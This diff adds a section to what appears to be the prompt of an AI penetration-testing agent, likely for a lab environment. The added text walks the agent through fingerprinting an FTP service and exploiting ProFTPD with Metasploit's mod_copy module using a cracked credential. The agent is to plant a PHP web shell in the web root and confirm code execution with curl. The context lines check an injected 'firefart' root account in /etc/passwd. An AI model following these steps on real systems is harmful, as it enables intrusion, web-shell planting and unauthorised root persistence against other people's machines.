@@ -376,6 +376,39 @@ rather than relying on cwd or env vars carrying over:
    /etc/passwd is still well-formed (neighboring lines intact, nothing split):
    grep '^firefart:' /etc/passwd
    id firefart
+
+NETWORK-SERVICE RCE — FTP (FINGERPRINT THE SERVICE, DON'T ASSUME IT):
+If recon turns up an FTP service (port 21, or any banner that smells like FTP),
+FINGERPRINT it yourself before reaching for any exploit: `nmap -sV -p 21
+<target>` from your Kali box, or a raw banner grab (`nc <target> 21` and read the
+220 line). WHICH daemon is listening and at what version is a FACT ABOUT THE BOX
+you read off the banner, never a given — an open FTP port tells you nothing about
+the software behind it. The Metasploit module catalog is tradecraft you may draw
+on, but which service is vulnerable and which module applies stays your discovery:
+pick a module only AFTER the banner tells you what you are talking to.
+
+IF — and only if — the banner identifies the daemon as ProFTPD AND you already
+hold a credential you cracked earlier this episode (your foothold cred; the
+module's SITE CPFR/CPTO copy needs an authenticated session, so this is a
+non-starter without one), you can turn that into command execution with
+Metasploit's mod_copy module. msfconsole is installed on your Kali box; drive it
+non-interactively through `run_on_attacker` (a cold load is slow — give it the
+one call, it has time):
+  msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS <target>; set RPORT 21; set FTPUSER <held-cred-user>; set FTPPASS <held-cred-pass>; set SITEPATH /var/www/html; run"
+Substitute the EXACT username/password you passed to use_credential for
+FTPUSER/FTPPASS (never invent one), and the target's web root for SITEPATH — the
+module copies a PHP payload into that directory via the FTP SITE copy commands,
+then reaches it over HTTP.
+
+VERIFY IT ACTUALLY EXECUTED — "exploit completed" is NOT proof:
+msf printing `[+]` or "session opened" only means the module RAN. Prove real
+command execution yourself: request the planted page and run a command through
+it, then confirm the command's OUTPUT comes back in the HTTP response. Curl it
+from your Kali box via `run_on_attacker`, e.g.
+  curl "http://<target>/<planted-page>?cmd=id"
+and look for genuine `id` output (`uid=...(...)`) in the response body. Only that
+returned command output — not msf's success banner — confirms you have RCE on the
+target.
 """
 
 
